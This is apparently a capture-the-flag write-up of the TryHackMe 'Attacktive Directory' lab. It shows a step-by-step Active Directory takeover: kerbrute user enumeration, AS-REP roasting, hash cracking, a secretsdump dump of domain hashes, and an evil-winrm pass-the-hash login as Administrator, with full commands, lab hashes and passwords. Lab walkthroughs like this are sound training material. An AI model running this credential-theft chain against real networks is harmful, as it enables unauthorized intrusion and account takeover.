# IP
10.10.180.210

## Enumeration

### Nmap
Found 13 ports open on the machine.
```console
❯ nmap -sC -sV 10.10.180.210  | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 10:10 IST
Nmap scan report for 10.10.180.210
Host is up (0.15s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-31 04:40:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-10-31T04:41:13+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-10-30T04:34:51
|_Not valid after:  2023-05-01T04:34:51
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-10-31T04:41:05+00:00
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-10-31T04:41:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
```

- As we can see that a port of `kerberos`(88) is open and we can also see that DNS name for Microsoft Remote Display is `spookysec.local`.
- `spookysec.local` seems to be an invalid TLD for Active Directory Domain. 
- Added `spokysec.local 10.10.180.210` to `/etc/hosts`.
- Started Enumeration with kerbrute.

### Kerbrute 
- Started enumeration usernames with the given username list.
- Found two interesting users `svc-admin` and `backup`.
```console
❯ kerbrute --dc spookysec.local  userenum -d spookysec.local userlist.txt   | tee kerbrute.log

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
Version: v1.0.3 (9dad6e1) - 10/31/22 - Ronnie Flathers @ropnop
2022/10/31 10:23:16 >  Using KDC(s):
2022/10/31 10:23:16 >  	spookysec.local:88
2022/10/31 10:23:17 >  [+] VALID USERNAME:	 james@spookysec.local
2022/10/31 10:23:20 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2022/10/31 10:23:23 >  [+] VALID USERNAME:	 James@spookysec.local
2022/10/31 10:23:24 >  [+] VALID USERNAME:	 robin@spookysec.local
2022/10/31 10:23:38 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2022/10/31 10:23:46 >  [+] VALID USERNAME:	 administrator@spookysec.local
2022/10/31 10:24:03 >  [+] VALID USERNAME:	 backup@spookysec.local
2022/10/31 10:24:11 >  [+] VALID USERNAME:	 paradox@spookysec.local
2022/10/31 10:25:01 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2022/10/31 10:25:17 >  [+] VALID USERNAME:	 Robin@spookysec.local
2022/10/31 10:26:56 >  [+] VALID USERNAME:	 Administrator@spookysec.local
 2022/10/31 10:30:17 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2022/10/31 10:31:20 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2022/10/31 10:35:01 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
```
- Started `GetNPUsers.py` of `impacket`

### ASREPRoasting
- We can try to get password hash for `svc-admin` if we can access `kerbros`  without password.
- Impacket has a tool called `GetNPUsers.py` which can be used to retrieve password hash.
```console
❯ python3 /opt/impacket/examples/GetNPUsers.py  spookysec.local/svc-admin -no-pass
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:60726a97d19ce538d68255fdc9343e5b$c809f43ef2ce45d50191f8d101b54c05bb41f1b8f32f4ce1dceba9259c9a259ed80d54a4acc1520eda89b488f4c4359dd1afd3bb680ba4cc828e756b9437d7d5fce5ff5bab732a1d23a296d664f6f7e95e69c0bf50827f8ce681727de7d9ebebacb4fe1933aaa6803e5ad1ff0f802fb7b18714a8f6a073630f4c0139628c4a2a42952891ab552d36e643a26a546fce399a267723be2102322dd78935bc032b705d6fbe8abe016b15fc40661625c84da6bf8ca0e53240957c907372949232188c4d6de0e9dec38d763a5b8dc5684ccf6185ae9f57c7d8d2c69d49caba4a35d42677d4905015b037b860567b1134451d2f8a0e
```
- Got password hash for `$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL`
```txt
60726a97d19ce538d68255fdc9343e5b$c809f43ef2ce45d50191f8d101b54c05bb41f1b8f32f4ce1dce    ba9259c9a259ed80d54a4acc1520eda89b488f4c4359dd1afd3bb680ba4cc828e756b9437d7d5fce5ff5bab732a1d23a296d664f6f7e95e69c0bf50827f8    ce681727de7d9ebebacb4fe1933aaa6803e5ad1ff0f802fb7b18714a8f6a073630f4c0139628c4a2a42952891ab552d36e643a26a546fce399a267723be2    102322dd78935bc032b705d6fbe8abe016b15fc40661625c84da6bf8ca0e53240957c907372949232188c4d6de0e9dec38d763a5b8dc5684ccf6185ae9f5    7c7d8d2c69d49caba4a35d42677d4905015b037b860567b1134451d2f8a0e
```
- Cracked hash with john.
```console
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   (?)
1g 0:00:00:17 DONE (2022-10-31 10:32) 0.05595g/s 326654p/s 326654c/s 326654C/s manaia05..mana7510
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Tried enumerating with `enum4linux`.


### SecrestsDump

- Started SecretsDump on the user `backup` and got hash for user `Administrator`
```console
❯ python3 /opt/impacket/examples/secretsdump.py  backup@spookysec.local
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
<-------------------------------------------------snip------------------------------------------------------------->
```


## Exploitation 

### Samba(svc-admin)
- Listed all shares for `svc-admin`.
```console
[+] Attempting to map shares on spookysec.local
//spookysec.local/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//spookysec.local/backup	Mapping: OK Listing: OK Writing: N/A
//spookysec.local/C$	Mapping: DENIED Listing: N/A Writing: N/A
[E] Can't understand response:
NT_STATUS_NO_SUCH_FILE listing \*
//spookysec.local/IPC$	Mapping: N/A Listing: N/A Writing: N/A
[E] Can't understand response
do_connect: Connection to AttacktiveDirectory.spookysec.local failed (Error NT_STATUS_UNSUCCESSFUL)
//spookysec.local/NETLOGON	Mapping: N/A Listing: N/A Writing: N/A
```
- We can connect to `backup` share and do listing.
- Got a `backup_credentials.txt`
```console
❯ smbclient  \\\\spookysec.local\\backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr  5 00:38:39 2020
  ..                                  D        0  Sun Apr  5 00:38:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020

		8247551 blocks of size 4096. 3558227 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```
- Found a base64 encoded credentials
```console
❯ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```
- With password of backup we can assume that `backup` account should be having more privilege than other users, so tried dumping hashes of other users with `secretsdump.py` in `impacket`.

### Evil-Winrn(Administrator)
```console
❯ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator

```
We are root :wink:

